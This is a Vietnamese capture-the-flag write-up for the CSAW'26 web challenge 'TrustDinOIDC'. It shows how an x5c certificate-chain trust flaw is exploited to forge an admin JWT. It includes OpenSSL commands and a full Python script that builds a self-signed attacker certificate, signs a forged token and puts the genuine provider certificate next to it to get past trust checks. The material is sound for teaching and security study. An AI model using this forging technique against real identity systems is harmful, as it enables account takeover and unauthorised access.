---
title: TrustDinOIDC
date: 2026-09-27
ctf: CSAW' 26 QUALS
category: web
difficulty: hard
tags:
  - JWT
  - leaf certificate
---

## Đề bài
TrustDinOIDC sells dinosaur posters to anyone who can prove they're logged in. The Flagosaurus print is for admins only.

https://dino2auth.ctf.csaw.io/
## Solution
Truy cập website, ta có giao diện sau và có thể login vào 1 trong 2 provider
![image](https://hackmd.io/_uploads/SkP9lllqzx.png)

Ta thử login thông qua cả 1 provider và lấy về  [JWT](https://viblo.asia/p/json-web-token-la-gi-aWj533go56m#C%E1%BA%A5u-tr%C3%BAc-JSON-Web-Token) của provider đó, sau đó decode bằng [JWT decoder](https://www.jwt.io/):

Ta thử với `strataid`:
:::spoiler
Ta có JWT (Json Web Token), decode được:
Header: 
```json!
{
  "alg": "RS256",
  "typ": "JWT",
  "x5c": 
    [ "MIICyjCCAbKgAwIBAgIUbCHTqaYloj+/94bnREhCnTfWSbcwDQYJKoZIhvcNAQELBQAwHzEdMBsGA1UEAwwUc3RyYXRhaWQuZXhhbXBsZS5jb20wHhcNMjYwOTIwMTcwOTEzWhcNMjcwOTIwMTcwOTEzWjAfMR0wGwYDVQQDDBRzdHJhdGFpZC5leGFtcGxlLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKzTVY2FTb+5805ipIC+HMT3TucM1ou6jRCdnJtTF/Vx8gKT4KoIkyMHDqbos7WDkNB2o2rw2uxyLpPybSd5JCGdqkLgijGclh4EiWXI+gZHqwG7ekpn0Ocxd1AvavUy/Q73dJFsQ9RnyTGjA242luDlBNQ/TXWv+WerHnGPDGrMTuOKp0ogKd9y/LVDWq3O+UXOtuUL0s/LDTf/Gev/MjLX7/K/c5GARuJI7s3lvfkWL2zo3qexIiEMBzAWYPbq7wSd5TgRGxbzXEudju6a/5GV+xhLdiDCUYg+rzbxq8WkUGc1QV7um5VyAAcVgYH3HgUwxkME9kFEg0JCnyrx8a0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAGBIx/hyXqVsYus2tajYevQhk0GqNY9uAgP2uoLqbDM6VYmg9t3Gm9qlewcMXlO9A3WbuUlnIno1YhlRGsdiN5D9H2Vx4e598cBBrs2Gc715lUUBD+dG1+nVg+BKR0ESeSTZlr//WAae8oRrIuWPDxh9G3Uu++p1tSNHzlFch0VcXJtfZFPIqe780x4P/WR522MNHomw+ORUw2j4Fi+HZg5CvT+zFThEiyLCqhfCFWEU7QGHkIRFwJj5J7TQfFNGiv7EuWWiXfNds3Z7MJJGzYeXti5g2dk8zmndD8XqqT3UFnZNvaDYGtJAa8txl1u52mSUVoLlENkygKqsmTfdrEA=="
  ]
}
```
Payload:
```json!
{
  "iss": "strataid.example.com",
  "sub": "guest",
  "aud": "trustdinoidc-portal",
  "scope": "openid profile freeosaurus:redeem",
  "exp": 1790129062
}
```
Signature verification: Public Key
```json!
{
  "e": "AQAB",
  "kty": "RSA",
  "n": "rNNVjYVNv7nzTmKkgL4cxPdO5wzWi7qNEJ2cm1MX9XHyApPgqgiTIwcOpuiztYOQ0HajavDa7HIuk_JtJ3kkIZ2qQuCKMZyWHgSJZcj6BkerAbt6SmfQ5zF3UC9q9TL9Dvd0kWxD1GfJMaMDbjaW4OUE1D9Nda_5Z6secY8MasxO44qnSiAp33L8tUNarc75Rc625QvSz8sNN_8Z6_8yMtfv8r9zkYBG4kjuzeW9-RYvbOjep7EiIQwHMBZg9urvBJ3lOBEbFvNcS52O7pr_kZX7GEt2IMJRiD6vNvGrxaRQZzVBXu6blXIABxWBgfceBTDGQwT2QUSDQkKfKvHxrQ"
}
```
:::


Để lấy được flag trong flagosaurus, ta cần có quyền admin
-> cần phải chuyển từ `"sub": "guest"`-> `"sub": "admin"`
-> Tạo JWT giả và chèn payload `"sub":"admin"`

Vậy ta sẽ muốn tạo 1 JWT chứa payload của attacker

Trong JWT có `"x5c":[certificate]`, với `x5c` viết tắt cho [X.509 certificate](https://viblo.asia/p/x509-certificate-duoc-su-dung-hang-ngay-3P0lPqbG5ox).

Để đọc được thông tin của X.509 certificate, ta cần phải decode từ Base64-> DER và đọc DER
Dùng OpenSSL:
```Bash!
# base64_x5c → DER
echo 'BASE64_X5C' | base64 -d > cert.der

# DER → đọc X.509
openssl x509 -inform DER -in cert.der -text -noout
```

Ta decode certificate của strataid thu được
```!
Certificate
├── Version
│   └── v3
├── Serial Number
│   └── 0x6c21d3a9a625a23fbff786e74448429d37d649b7
├── Subject
│   └── CN=strataid.example.com
├── Issuer
│   └── CN=strataid.example.com
├── Validity
│   ├── Not Before: 2026-09-20 17:09:13 UTC
│   └── Not After : 2027-09-20 17:09:13 UTC
├── Public Key
│   ├── Type: RSA
│   ├── Size: 2048 bits
│   └── Exponent: 65537
└── Certificate Signature
    └── SHA256 + RSA
```

=> Nhận thấy `issuer`==`subject`
=> Certificate này khai Strataid là đối tượng được cấp và cũng là bên cấp, là một dấu hiệu đáng ngờ của `self-signed certificate`

Muốn xác nhận cryptographically, ta cần kiểm tra certificate có thể tự verify bằng chính `public key` của nó hay không.

Để kiểm tra certificate có tự kí không, ta cần phải chuyển từ DER về PEM và verify
```bash!
# DER → PEM
openssl x509 -inform DER -in cert.der -out cert.pem

# Verify
openssl verify -CAfile cert.pem cert.pem.
```

Thu được `cert.pem: OK`, vậy ta biết đây là một `self-signed certificate`

Certificate của provider là self-signed, cho thấy hệ thống có thể sử dụng một trust model không dựa trên chuỗi CA bên ngoài thông thường. Vì vậy, một hướng điều tra hợp lý là thử tạo một `self-signed certificate` với `key pair` do attacker kiểm soát.

Sau đó tạo JWT giả và kí với `private key` mà attacker kiểm soát 

Sau khi thử nhập JWT với `headers={"x5c": [attacker_cert]}` mà không có `trusted cert`, Nhận thấy web vẫn coi ta chưa login

Điều này cho thấy: `JWT signature = hợp lệ`
nhưng: `attacker certificate = chưa được server trust`

=> Vấn đề không nằm ở cryptography mà nằm ở trust validation.

Ta chỉnh lại `solve.py`
```
x5c
├── attacker certificate
│       ↓
│   attacker public key
│       ↓
│   verify JWT
│
└── trusted certificate
        ↓
   server đánh dấu trusted
```
->Flag: `csaw{str4ta_sk1pped_th3_p1n}`
![image](https://hackmd.io/_uploads/BJ75UHM5Ge.png)

Code đầy đủ solve:
```python!
import base64
import datetime
import json
import re
from pathlib import Path

import jwt
import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

BASE = "https://dino2auth.ctf.csaw.io"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
}

def get_idp_cert(provider):
    r = requests.get(
        f"{BASE}/idp/{provider}/authorize",
        params={
            "client_id": "trustdinoidc-portal",
            "redirect_uri": f"{BASE}/oauth/callback",
            "scope": "openid profile freeosaurus:redeem",
            "state": "solve",
        },
        headers=HEADERS,
        timeout=15,
    )
    token = re.search(r'name="id_token" value="([^"]+)', r.text).group(1)
    header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "=="))
    return header["x5c"][0]


def make_attacker_cert(key, issuer):
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, issuer)])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=1))
        .not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365))
        .sign(key, hashes.SHA256())
    )
    return base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()


issuer = "strataid.example.com"
trusted_cert = get_idp_cert("strataid")
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
attacker_cert = make_attacker_cert(key, issuer)
claims = {
    "iss": issuer,
    "sub": "admin",
    "aud": "trustdinoidc-portal",
    "scope": "openid profile freeosaurus:redeem flagosaurus:redeem",
    "exp": int(datetime.datetime.now(datetime.timezone.utc).timestamp()) + 3600,
}
token = jwt.encode(
    claims,
    key,
    algorithm="RS256",
    headers={"x5c": [attacker_cert, trusted_cert]},
)
Path("session-cookie.txt").write_text(token + "\n")

page = requests.get(
    f"{BASE}/",
    headers=HEADERS,
    cookies={"session": token},
    timeout=15,
)
page.raise_for_status()
flag = re.search(r"[A-Za-z0-9_]+\{[^{}]+\}", page.text)
if not flag:
    raise RuntimeError("flag not found")

path = Path("flag.txt")
if not path.exists():
    path.write_text(flag.group(0) + "\n")
    print("flag saved to flag.txt")
else:
    print("flag.txt already exists; not overwritten")
print("fresh cookie saved to session-cookie.txt")
```
